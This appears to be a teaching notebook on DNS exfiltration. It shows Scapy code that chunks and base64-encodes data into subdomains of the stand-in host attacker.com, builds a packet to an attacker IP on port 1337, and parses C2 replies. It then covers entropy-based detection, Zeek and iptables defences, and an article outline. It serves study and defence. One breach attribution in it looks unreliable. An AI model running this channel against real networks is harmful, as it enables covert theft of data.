# DNS Exfiltration

---

**MITRE ATT&CK** `T1048.003` · **Tactic:** Exfiltration · **Difficulty:** Intermediate · **Time:** ~60 min

> Almost every corporate firewall blocks outbound HTTP/HTTPS to unknown destinations. Almost none of them block DNS. Organizations need DNS to resolve internal hostnames and reach the internet, so port 53/UDP is virtually never firewalled outbound. Attackers figured this out in the early 2000s and it's still one of the most reliable exfiltration channels today.

---

### What you'll understand after this notebook

1. How DNS query structure is exploited to carry arbitrary data in subdomain labels
2. The encoding pipeline: raw data → base64 → DNS query → attacker's authoritative resolver
3. Why most firewalls allow this traffic and why it's hard to block without breaking things
4. How to detect DNS exfiltration using query frequency, entropy analysis, and length anomalies

---

### Real-world context

DNS tunneling was used in the 2020 SolarWinds/SUNBURST attack — the malware encoded victim data in DNS queries to attacker-controlled nameservers. The Feathered Serpent APT group used DNS tunneling throughout 2018-2020 for C2 and exfiltration from government networks. FrameworkPOS malware (2014 Target breach) used DNS to exfiltrate credit card data. This is not a theoretical technique.

## 1. How DNS Queries Carry Data

A DNS query looks like this:

```
QUERY: VGhpcyBpcyBk.google.com
        ──────────────  ──────────
        subdomain label  domain
        (our data)       (attacker-controlled)
```

The **subdomain label** can be up to 63 characters. The full FQDN can be up to 253 characters. The data is base64-encoded and placed in the subdomain position.

When this query reaches the DNS resolver, it's forwarded to the authoritative nameserver for `google.com` (in a real attack, an attacker-owned domain). The attacker's nameserver sees the query, extracts the subdomain, decodes it, and has the data.

```
Victim machine
  │
  │ UDP/53: QUERY VGhpcyBpcyBk.attacker.com
  ▼
Corporate DNS resolver  (allowed — it's just a DNS query)
  │
  │ forwards to authoritative nameserver for attacker.com
  ▼
Attacker's nameserver  ← receives the query, extracts encoded data
  │
  │ responds with crafted DNS response
  ▼
Corporate DNS resolver
  │
  ▼
Victim machine  ← receives response (used for acknowledgment/C2 commands)
```

**Bandwidth:** DNS labels are limited to 63 chars, and base64 encoding inflates by ~33%, so each query carries about 47 bytes of raw data. Slow, but adequate for credentials, keys, and small files.

In [ ]:
from scapy.all import *
from base64 import b64encode, b64decode
import matplotlib.pyplot as plt
import numpy as np
import math
from collections import Counter

conf.verb = 0

## 2. The Encoding Pipeline

The original script encodes data in 10-byte chunks. Let's understand why and trace through a real example.

In [ ]:
def demonstrate_encoding(data, chunk_size=10):
    """
    Shows the full encoding pipeline for DNS exfiltration.
    Breaks data into chunks, base64-encodes each, shows what query would be sent.
    """
    print(f'Original data: "{data}"')
    print(f'Length: {len(data)} bytes')
    print(f'Chunk size: {chunk_size} bytes')
    print(f'Chunks needed: {math.ceil(len(data)/chunk_size)}')
    print()
    print(f'{'Chunk':<15} {'Base64':<20} {'DNS Query (would be sent)'}')
    print('─' * 75)
    
    queries = []
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        
        # base64 encode the chunk
        encoded = b64encode(chunk.encode('utf-8')).decode('utf-8')
        
        # Strip base64 padding ('=') — not valid in DNS labels
        encoded_stripped = encoded.rstrip('=')
        
        # This would become the subdomain label
        dns_query = f'{encoded_stripped}.attacker.com'
        queries.append(dns_query)
        
        print(f'{repr(chunk):<15} {encoded_stripped:<20} {dns_query}')
    
    print(f'\nTotal DNS queries: {len(queries)}')
    print(f'Total bytes over wire (approx): {sum(len(q) for q in queries)} bytes')
    
    return queries


# Trace the exact data from the original script
queries = demonstrate_encoding('This is data being exfiltrated over DNS')

## 3. Packet Construction — The Original Script

The original script constructs custom DNS packets using Scapy, targeting a specific DNS server IP. Let's dissect the packet structure.

In [ ]:
# Reconstruct the original script's packet construction for analysis
# We're building the packet to inspect it — NOT sending in this cell

attacker_dns_server = '10.10.10.8'  # attacker's authoritative DNS server
domain = 'attacker.com'             # attacker-owned domain
subdomain = 'VGhpcyBpcyBk'         # base64-encoded data

# Full query: encoded_data.attacker.com
fqdn = f'{subdomain}.{domain}'.encode('utf-8')

# Build the packet layer by layer
# Note: the original uses Ether layer to control src/dst MAC directly
# This bypasses the OS routing stack entirely

dns_query  = DNSQR(qname=fqdn)
dns_header = DNS(qd=dns_query)
udp_layer  = UDP(dport=1337)  # Note: port 1337, not 53! Custom C2 server
ip_layer   = IP(dst=attacker_dns_server)

packet = ip_layer / udp_layer / dns_header

print('=== Packet Structure ===')
print(f'IP dst:        {packet[IP].dst}')
print(f'UDP dport:     {packet[UDP].dport}  ← NOT standard 53! Custom C2 port')
print(f'DNS qname:     {packet[DNS].qd.qname}')
print()
print('Key insight: using UDP/1337 instead of 53 means this bypasses')
print('a standard DNS-based detection that looks at port 53 traffic only.')
print('A more sophisticated version would use port 53 to blend in completely.')

## 4. Response Processing — The C2 Channel

The original script's `process()` function reads the last character of the DNS response's rdata field to get a status code. This is a simple C2 acknowledgment channel — the server can also send back commands using the same mechanism.

In [ ]:
# The original process() function — annotated
def process_response(response):
    """
    Reads the last character of the DNS response's answer rdata.
    
    The attacker's DNS server encodes status in the response:
      '1' = chunk received successfully
      '2' = end of transmission acknowledged  
      other = transmission error
    
    This is the C2 channel: the client gets back simple commands/status
    through what looks like normal DNS response traffic.
    """
    # Extract the IP address from the DNS A record response
    # rdata for an A record is the IP address string: e.g. '1.2.3.1'
    rdata = str(response[DNS].an.rdata)
    
    # Last octet of the IP encodes the status
    # e.g., 1.2.3.1 → status '1' (received OK)
    #        1.2.3.2 → status '2' (end ACK)
    status_code = int(rdata[-1])
    
    if status_code == 1:
        return 'received'
    elif status_code == 2:
        return 'end_ack'
    else:
        return 'error'


print('C2 channel via DNS responses:')
print('  Response IP 1.2.3.1 → status: received (continue sending)')
print('  Response IP 1.2.3.2 → status: end_ack (transmission complete)')
print()
print('This bidirectional channel is what makes DNS exfiltration C2-capable,')
print('not just one-way exfiltration. The attacker can send back commands')
print('through crafted DNS responses.')

## 5. Detection: Entropy Analysis

Normal DNS subdomains look like: `www`, `mail`, `api`, `cdn`. DNS exfiltration subdomains look like: `VGhpcyBpcyBk`, `dGVzdGRhdGE=`, `aGVsbG8gd29y`.

The key difference: **Shannon entropy**. Real subdomains have low entropy (repetitive, human-readable). Base64-encoded data has high entropy (~6 bits per character). This is the primary detection signal.

In [ ]:
def shannon_entropy(s):
    """Calculate Shannon entropy of a string. Higher = more random."""
    if not s:
        return 0
    freq = Counter(s)
    length = len(s)
    return -sum(
        (count/length) * math.log2(count/length)
        for count in freq.values()
    )


# Compare entropy of legitimate vs malicious subdomains
legitimate_queries = [
    'www', 'mail', 'api', 'cdn', 'static', 'blog', 'docs',
    'dev', 'staging', 'internal', 'vpn', 'portal', 'admin'
]

# Simulated DNS exfil (base64 of random data, 10-char chunks)
import secrets
malicious_queries = [
    b64encode(secrets.token_bytes(10)).decode().rstrip('=')
    for _ in range(13)
]

legit_entropies = [shannon_entropy(q) for q in legitimate_queries]
mal_entropies   = [shannon_entropy(q) for q in malicious_queries]

print(f'Legitimate subdomains — avg entropy: {np.mean(legit_entropies):.2f}')
print(f'Exfil subdomains      — avg entropy: {np.mean(mal_entropies):.2f}')

# Visualization
fig, ax = plt.subplots(figsize=(11, 5))
fig.patch.set_facecolor('#0F0F0F')
ax.set_facecolor('#1A1A1A')

x = range(len(legitimate_queries))
ax.scatter(x, legit_entropies, color='#6CCF9B', s=80, zorder=5, label='Legitimate subdomains')
ax.scatter(x, mal_entropies,   color='#CF6C6C', s=80, zorder=5, label='Exfil (base64 data)', marker='x')

# Annotate a few examples
for i, (q, e) in enumerate(zip(legitimate_queries[:5], legit_entropies[:5])):
    ax.annotate(q, (i, e), textcoords='offset points', xytext=(0, 8),
                color='#6CCF9B', fontsize=8, fontfamily='monospace', ha='center')

for i, (q, e) in enumerate(zip(malicious_queries[:3], mal_entropies[:3])):
    ax.annotate(q[:12]+'...', (i, e), textcoords='offset points', xytext=(0, -16),
                color='#CF6C6C', fontsize=7, fontfamily='monospace', ha='center')

# Detection threshold line
threshold = 3.5
ax.axhline(y=threshold, color='#CFB86C', linestyle='--', alpha=0.7, label=f'Detection threshold ({threshold})')

ax.set_ylabel('Shannon Entropy (bits)', color='#7A7570')
ax.set_xlabel('Query index', color='#7A7570')
ax.set_title('DNS Subdomain Entropy — Legitimate vs Exfiltration Traffic', color='#EDEAE4', fontsize=12)
ax.tick_params(colors='#7A7570')
ax.legend(facecolor='#1A1A1A', edgecolor='#282828', labelcolor='#EDEAE4')
for spine in ax.spines.values():
    spine.set_edgecolor('#282828')

plt.tight_layout()
plt.savefig('../cyberlab/content/articles/18_dns_entropy.png', dpi=150, bbox_inches='tight')
plt.show()

## 6. Defender's Perspective

### Why it's hard to block

You can't block all DNS traffic — your network stops working. You can't block unknown domains — half the internet. What you *can* do:

### Detection methods

| Method | Signal | Tool |
|--------|--------|------|
| **Entropy analysis** | High Shannon entropy in subdomain labels | Custom SIEM rule, Zeek script |
| **Query length** | Normal subdomains < 20 chars; exfil labels are 16-63 chars | Zeek `dns.log` |
| **Query rate** | Normal host makes ~100 DNS queries/day; exfil makes thousands | Zeek, Splunk |
| **NXDomain rate** | Exfil probes often generate many NXDOMAIN responses | DNS server logs |
| **Unique subdomains per domain** | 1000 different subdomains for same domain = exfil | Zeek |
| **DNS-only destinations** | Domains queried but never connected via HTTP = suspicious | Bro/Zeek correlation |

### Zeek detection query

```zeek
# Alert on DNS queries with high-entropy subdomains longer than 20 chars
event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count) {
    local subdomain = split_string(query, /\./)[0];
    if (|subdomain| > 20 && entropy(subdomain) > 3.5) {
        print fmt("Suspicious DNS exfil: %s queried %s", c$id$orig_h, query);
    }
}
```

### Network controls

```bash
# Force all DNS through your monitored resolver (blocks direct DNS to attacker's server)
iptables -A OUTPUT -p udp --dport 53 ! -d your_internal_resolver -j DROP
iptables -A OUTPUT -p tcp --dport 53 ! -d your_internal_resolver -j DROP
# This blocks the original script's UDP/1337 trick AND forces DNS logging
```

## 7. Article Seed

---

**Suggested title:** *DNS Exfiltration: Stealing Data Through Your Firewall's Blind Spot*

**Opening paragraph (edit this):**

> Almost every corporate firewall blocks outbound connections to unknown IPs. Almost none of them block DNS. That's the fundamental vulnerability that DNS exfiltration exploits — and it's been used in some of the most significant breaches of the last decade, including SolarWinds. In this article, I'll show you exactly how data gets encoded into DNS queries using Python and Scapy, why it bypasses most security tools, and the entropy analysis technique that can catch it.

**Section headers:**
1. How DNS query structure becomes a data transport channel
2. The encoding pipeline: raw data → base64 → subdomain label
3. The C2 channel: using DNS responses to send back commands
4. Detection: entropy analysis and query pattern anomalies

**Medium tags:** `cybersecurity, dns, python, exfiltration, threat-detection`

---

In [ ]:
# Self-check

# Q1: What is the maximum character length of a DNS subdomain label?
max_label_length = None  # integer
assert max_label_length == 63, 'DNS labels are limited to 63 characters per label'

# Q2: Why is Shannon entropy useful for detecting DNS exfiltration?
entropy_detection = None  # describe in a few words
assert 'random' in entropy_detection.lower() or 'base64' in entropy_detection.lower(), \
    'Base64 data has high entropy (looks random); normal subdomains have low entropy'

# Q3: Why did the original script use UDP port 1337 instead of 53?
port_1337_reason = None
assert 'detect' in port_1337_reason.lower() or 'bypass' in port_1337_reason.lower() or 'custom' in port_1337_reason.lower(), \
    'Custom port bypasses DNS-specific monitoring rules that only watch port 53'

print('All checks passed. You understand DNS exfiltration.')